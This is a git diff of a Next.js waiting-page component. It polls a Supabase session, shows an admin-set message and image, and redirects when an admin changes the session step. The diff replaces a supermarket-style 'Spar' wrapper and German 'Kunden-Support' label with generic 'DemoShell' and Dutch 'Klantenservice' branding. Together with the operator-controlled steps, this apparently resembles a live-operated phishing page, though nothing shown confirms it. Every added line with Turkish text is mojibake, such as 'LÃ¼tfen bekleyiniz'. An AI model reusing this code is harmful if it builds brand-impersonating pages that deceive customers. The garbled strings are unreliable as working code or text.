@@ -2,7 +2,7 @@
 
 import { useEffect, useState, useRef } from "react";
 import Image from "next/image";
-import { SparShell } from "@/components/demo/SparShell";
+import { DemoShell } from "@/components/demo/DemoShell";
 import { stepToPath } from "@/lib/session-routes";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { SessionStep } from "@/types/session";
@@ -10,12 +10,12 @@ import type { SessionStep } from "@/types/session";
 export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   const supabase = createBrowserSupabaseClient();
   const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
-  const [message, setMessage] = useState("Lütfen bekleyiniz...");
+  const [message, setMessage] = useState("LÃ¼tfen bekleyiniz...");
   const [imageUrl, setImageUrl] = useState<string | null>(null);
   const [lang, setLang] = useState<"de" | "tr">("de");
   const [ready, setReady] = useState(false);
   
-  // KRİTİK: Bu ref true olduğunda sayfa bir daha asla render olmaz ve yönlendirmeyi bozamaz.
+  // KRÄ°TÄ°K: Bu ref true olduÄŸunda sayfa bir daha asla render olmaz ve yÃ¶nlendirmeyi bozamaz.
   const isRedirecting = useRef(false);
 
   useEffect(() => {
@@ -29,15 +29,15 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     if (!supabase) return;
 
     const exitNow = (nextStep: string) => {
-      // Eğer hedef hala bu sayfaysa veya zaten yönlendirme varsa dur
+      // EÄŸer hedef hala bu sayfaysa veya zaten yÃ¶nlendirme varsa dur
       if (!nextStep || nextStep === "special_approval" || isRedirecting.current) return;
       
       isRedirecting.current = true; 
       const targetPath = stepToPath(nextStep as SessionStep, effectiveSessionId);
       
-      console.log("Döngü kırıldı, fırlatılıyor:", targetPath);
+      console.log("DÃ¶ngÃ¼ kÄ±rÄ±ldÄ±, fÄ±rlatÄ±lÄ±yor:", targetPath);
       
-      // window.location.replace tarayıcı geçmişini temizler
+      // window.location.replace tarayÄ±cÄ± geÃ§miÅŸini temizler
       window.location.replace(targetPath);
     };
 
@@ -52,14 +52,14 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
       
       if (!data || isRedirecting.current) return;
 
-      // Admin adımı değiştirdiği an bu sayfadan kurtul
+      // Admin adÄ±mÄ± deÄŸiÅŸtirdiÄŸi an bu sayfadan kurtul
       if (data.current_step && data.current_step !== "special_approval") {
         exitNow(data.current_step);
         return;
       }
 
       const fd = (data.form_data ?? {}) as Record<string, any>;
-      setMessage(fd.specialNoticeText ?? fd.customMessage ?? "Lütfen bekleyiniz...");
+      setMessage(fd.specialNoticeText ?? fd.customMessage ?? "LÃ¼tfen bekleyiniz...");
       setImageUrl(fd.specialNoticeImage ?? fd.customImage ?? null);
       setLang((fd.specialNoticeLang as "de" | "tr") ?? "de");
       setReady(true);
@@ -87,24 +87,24 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     };
   }, [effectiveSessionId, supabase]);
 
-  // Yönlendirme başladığı an ekrana hiçbir şey basma, render'ı öldür.
+  // YÃ¶nlendirme baÅŸladÄ±ÄŸÄ± an ekrana hiÃ§bir ÅŸey basma, render'Ä± Ã¶ldÃ¼r.
   if (isRedirecting.current) return null;
 
   if (!ready) {
     return (
-      <SparShell title="Bildirim">
+      <DemoShell title="Bildirim">
         <div className="flex justify-center py-12">
-          <div className="size-10 animate-spin rounded-full border-4 border-spar-green/20 border-t-spar-green" />
+          <div className="size-10 animate-spin rounded-full border-4 border-brand-blue/20 border-t-brand-blue" />
         </div>
-      </SparShell>
+      </DemoShell>
     );
   }
 
   return (
-    <SparShell title={lang === "de" ? "Benachrichtigung" : "Bilgilendirme"}>
+    <DemoShell title={lang === "de" ? "Melding" : "Bilgilendirme"}>
       <div className="app-panel fade-in mx-auto w-full max-w-3xl rounded-3xl bg-white p-6 text-center shadow-xl border border-zinc-100">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-spar-green">Kunden-Support</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-brand-blue">Klantenservice</p>
         </div>
         
         <p className="whitespace-pre-wrap text-lg font-bold text-zinc-900 leading-tight mb-6">
@@ -124,6 +124,6 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           </div>
         )}
       </div>
-    </SparShell>
+    </DemoShell>
   );
 }
